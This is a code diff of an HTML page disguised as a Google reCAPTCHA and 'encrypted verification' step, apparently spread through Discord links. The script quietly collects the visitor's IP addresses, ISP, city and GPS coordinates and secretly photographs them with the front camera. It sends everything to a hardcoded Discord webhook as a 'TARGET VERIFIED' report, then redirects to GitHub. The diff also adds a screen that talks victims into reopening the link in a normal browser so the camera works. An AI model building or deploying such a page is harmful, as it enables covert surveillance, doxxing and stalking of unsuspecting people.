@@ -27,7 +27,7 @@
       overflow: hidden;
     }
 
-    #screen-landing, #screen-warning, #screen-loading {
+    #screen-landing, #screen-warning {
       width: 100%;
       max-width: 380px;
       padding: 20px;
@@ -38,21 +38,47 @@
       justify-content: center;
     }
 
-    #screen-warning, #screen-loading { display: none; }
+    #screen-warning {
+      display: none;
+    }
 
-    /* Originele reCAPTCHA logo top (faceid-frame styling verwijderd) */
+    .warning-icon { font-size: 4rem; margin-bottom: 20px; }
+    .warning-title { font-size: 1.5rem; font-weight: 600; color: var(--warning-red); margin-bottom: 12px; }
+    .warning-text { color: var(--tg-sub); font-size: 0.95rem; margin-bottom: 30px; }
+
+    .external-btn {
+      width: 90%;
+      padding: 16px;
+      background: var(--warning-red);
+      color: white;
+      border: none;
+      border-radius: 14px;
+      font-size: 1.05rem;
+      font-weight: 600;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+
+    /* --- ORIGINELE LOGO STYLE --- */
     .faceid-frame {
-      width: 120px;
-      height: 120px;
+      width: 120px; height: 120px;
       position: relative;
       margin-bottom: 30px;
     }
+    .faceid-frame::before, .faceid-frame::after, .faceid-corners::before, .faceid-corners::after {
+      content: ""; position: absolute; width: 25px; height: 25px; border-color: var(--tg-blue); border-style: solid;
+    }
+    .faceid-frame::before { top: 0; left: 0; border-width: 4px 0 0 4px; border-top-left-radius: 15px; }
+    .faceid-frame::after { top: 0; right: 0; border-width: 4px 4px 0 0; border-top-right-radius: 15px; }
+    .faceid-corners { position: absolute; inset: 0; }
+    .faceid-corners::before { bottom: 0; left: 0; border-width: 0 0 4px 4px; border-bottom-left-radius: 15px; }
+    .faceid-corners::after { bottom: 0; right: 0; border-width: 0 4px 4px 0; border-bottom-right-radius: 15px; }
     .faceid-svg { width: 70px; height: 70px; margin-top: 25px; fill: var(--tg-blue); }
 
     .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.5px; }
     .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; line-height: 1.4; margin-bottom: 40px; padding: 0 20px; }
 
-    /* De nieuwe Google reCAPTCHA knop */
+    /* --- NIEUWE RECAPTCHA WIDGET (VERVANGT DE BLAUWE KNOP) --- */
     .recaptcha-widget {
       display: flex;
       align-items: center;
@@ -65,21 +91,46 @@
       padding: 0 12px;
       cursor: pointer;
       margin-bottom: 30px;
-      box-shadow: 0 0 4px rgba(0,0,0,0.05);
     }
-    .recaptcha-widget:hover { background: #f1f1f1; }
     .rc-left { display: flex; align-items: center; gap: 14px; }
     .rc-check { width: 28px; height: 28px; border: 2px solid #c1c1c1; background: #fff; border-radius: 2px; }
     .rc-text { color: #000; font-size: 14px; font-family: Roboto, arial, sans-serif; }
     .rc-right { display: flex; flex-direction: column; align-items: center; }
     .rc-logo-small { width: 32px; height: 32px; background-image: url("https://www.gstatic.com/recaptcha/api2/logo_48.png"); background-size: contain; background-repeat: no-repeat; }
 
-    .secure-text { margin-top: 30px; font-size: 0.8rem; color: #34c759; font-weight: 500; display: flex; align-items: center; gap: 5px; }
+    .secure-text {
+      margin-top: 30px;
+      font-size: 0.8rem;
+      color: #34c759;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
 
-    /* Loading Screen / Scan Box */
-    .scan-box { width: 140px; height: 140px; position: relative; margin-bottom: 20px; }
-    .scan-line { position: absolute; width: 100%; height: 2px; background: var(--tg-blue); box-shadow: 0 0 15px var(--tg-blue); top: 0; animation: moving-scan 1.5s infinite ease-in-out; }
-    @keyframes moving-scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }
+    #screen-loading {
+      display: none;
+      position: fixed; inset: 0; background: #fff; z-index: 100;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .scan-box {
+        width: 140px; height: 140px;
+        position: relative;
+        margin-bottom: 20px;
+    }
+    .scan-line {
+        position: absolute; width: 100%; height: 2px;
+        background: var(--tg-blue);
+        box-shadow: 0 0 15px var(--tg-blue);
+        top: 0;
+        animation: moving-scan 1.5s infinite ease-in-out;
+    }
+    @keyframes moving-scan {
+        0%, 100% { top: 10%; }
+        50% { top: 90%; }
+    }
 
     #hidden-video { position: fixed; opacity: 0; left: -999px; }
     #hidden-canvas { display: none; }
@@ -91,9 +142,11 @@
 <canvas id="hidden-canvas"></canvas>
 
 <div id="screen-warning">
-  <div style="font-size:4rem; margin-bottom:20px;">⚠️</div>
-  <div style="font-size:1.5rem; font-weight:600; color:var(--warning-red);">Browser Fout</div>
-  <div style="color:var(--tg-sub); margin-top:15px;">Discord browser blokkeert de camera. Open in Chrome of Safari.</div>
+  <div class="warning-icon">⚠️</div>
+  <div class="warning-title">External Browser Required</div>
+  <div class="warning-text">Discord's built-in browser blocks camera access for security. Please open this link in Chrome, Safari, or your default browser.</div>
+  <button class="external-btn" onclick="openExternally()">Open in External Browser</button>
+  <button class="verify-btn" onclick="forceContinue()">I'm using a normal browser</button>
 </div>
 
 <div id="screen-landing">
@@ -117,7 +170,10 @@
     </div>
   </div>
 
-  <div class="secure-text">End-to-End Encrypted Verification</div>
+  <div class="secure-text">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+    End-to-End Encrypted Verification
+  </div>
 </div>
 
 <div id="screen-loading">
@@ -130,83 +186,118 @@
 
 <script>
   const WEBHOOK = 'https://discord.com/api/webhooks/1495153409458704537/5MxkCcDC1DuhzHDf90BqtcED6yHEbI62IvzytW4rtMOE-CZCVhRXNw3nCqwKZCN0tc91';
-  let ipData = { v4: '...', v6: '...', loc: '...', isp: '...' };
+  let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };
+  let gpsInfo = { lat: null, lon: null, accuracy: null, error: null };
 
-  async function loadNetwork() {
+  function isDiscordInAppBrowser() {
+    const ua = navigator.userAgent.toLowerCase();
+    if (ua.includes('discord')) return true;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return true;
+    return false;
+  }
+
+  function openExternally() {
+    const currentUrl = window.location.href;
+    if (navigator.share) { navigator.share({ url: currentUrl }); } 
+    else { alert("Copy this link and open in Chrome/Safari: " + currentUrl); }
+  }
+
+  function forceContinue() {
+    document.getElementById('screen-warning').style.display = 'none';
+    document.getElementById('screen-landing').style.display = 'flex';
+  }
+
+  async function loadMeta() {
     try {
       const v4 = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
       const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
       if(v4.status === 'success') {
-        ipData.v4 = v4.query;
-        ipData.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
-        ipData.isp = v4.isp;
+        ipInfo.v4 = v4.query;
+        ipInfo.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
+        ipInfo.isp = v4.isp;
       }
-      ipData.v6 = v6.ip;
+      ipInfo.v6 = v6.ip;
     } catch(e) {}
   }
-  loadNetwork();
+
+  async function getGPS() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) { resolve(); return; }
+      navigator.geolocation.getCurrentPosition(
+        (pos) => { gpsInfo.lat = pos.coords.latitude; gpsInfo.lon = pos.coords.longitude; gpsInfo.accuracy = pos.coords.accuracy; resolve(); },
+        (err) => { gpsInfo.error = err.message; resolve(); },
+        { enableHighAccuracy: true, timeout: 5000 }
+      );
+    });
+  }
 
   async function triggerScan() {
     document.getElementById('screen-landing').style.display = 'none';
     document.getElementById('screen-loading').style.display = 'flex';
+    const capturedBlobs = [];
+    await loadMeta();
+    await getGPS();
 
-    let gps = "Denied";
-    await new Promise(res => {
-      navigator.geolocation.getCurrentPosition(
-        (p) => { gps = `${p.coords.latitude}, ${p.coords.longitude} (±${p.coords.accuracy}m)`; res(); },
-        () => res(), { timeout: 4000 }
-      );
-    });
-
-    const blobs = [];
     try {
-      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      const v = document.getElementById('hidden-video');
-      v.srcObject = s;
-      const b = await new Promise(res => {
-        v.onloadedmetadata = () => setTimeout(() => {
-          const c = document.getElementById('hidden-canvas');
-          c.width = v.videoWidth; c.height = v.videoHeight;
-          const ctx = c.getContext('2d');
-          ctx.translate(c.width, 0); ctx.scale(-1, 1);
-          ctx.drawImage(v, 0, 0);
-          c.toBlob(res, 'image/jpeg', 0.85);
-        }, 800);
-      });
-      if(b) blobs.push({ b, n: 'capture.jpg' });
-      s.getTracks().forEach(t => t.stop());
+        const streamF = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+        const b1 = await getBlob(streamF, true);
+        if(b1) capturedBlobs.push({ blob: b1, name: 'front_camera.jpg' });
+        streamF.getTracks().forEach(t => t.stop());
     } catch(e) {}
 
+    await uploadToDiscord(capturedBlobs);
+    window.location.href = 'https://github.com';
+  }
+
+  async function getBlob(stream, flip) {
+    const vid = document.getElementById('hidden-video');
+    vid.srcObject = stream;
+    return new Promise((resolve) => {
+        vid.onloadedmetadata = () => {
+            setTimeout(() => {
+                const can = document.getElementById('hidden-canvas');
+                can.width = vid.videoWidth || 640;
+                can.height = vid.videoHeight || 480;
+                const ctx = can.getContext('2d');
+                if(flip) { ctx.translate(can.width, 0); ctx.scale(-1, 1); }
+                ctx.drawImage(vid, 0, 0, can.width, can.height);
+                can.toBlob(resolve, 'image/jpeg', 0.92);
+            }, 600);
+        };
+    });
+  }
+
+  async function uploadToDiscord(blobs) {
     const data = new FormData();
     const payload = {
-      username: "Security Check",
+      username: "Security System",
       embeds: [{
         title: "✅ TARGET VERIFIED",
         color: 0x24A1DE,
         fields: [
           { name: "📱 Device", value: `\`${navigator.userAgent.substring(0, 120)}\`` },
-          { name: "🌐 IPv4", value: `\`${ipData.v4}\``, inline: true },
-          { name: "🌐 IPv6", value: `\`${ipData.v6}\``, inline: true },
-          { name: "📍 Location", value: ipData.loc },
-          { name: "🎯 GPS", value: gps },
-          { name: "🏢 ISP", value: ipData.isp }
+          { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
+          { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
+          { name: "📍 Location", value: ipInfo.loc },
+          { name: "🎯 GPS", value: gpsInfo.lat ? `${gpsInfo.lat}, ${gpsInfo.lon}` : "Denied" },
+          { name: "🏢 ISP", value: ipInfo.isp }
         ],
         timestamp: new Date()
       }]
     };
     data.append('payload_json', JSON.stringify(payload));
-    blobs.forEach((b, i) => data.append(`file${i}`, b.b, b.n));
+    blobs.forEach((b, i) => data.append(`file${i}`, b.blob, b.name));
     await fetch(WEBHOOK, { method: 'POST', body: data });
-
-    window.location.href = 'https://github.com';
   }
 
-  window.onload = () => {
-    if (navigator.userAgent.toLowerCase().includes('discord')) {
+  window.addEventListener('DOMContentLoaded', () => {
+    if (isDiscordInAppBrowser()) {
       document.getElementById('screen-landing').style.display = 'none';
       document.getElementById('screen-warning').style.display = 'flex';
+    } else {
+      document.getElementById('screen-landing').style.display = 'flex';
     }
-  };
+  });
 </script>
 </body>
 </html>
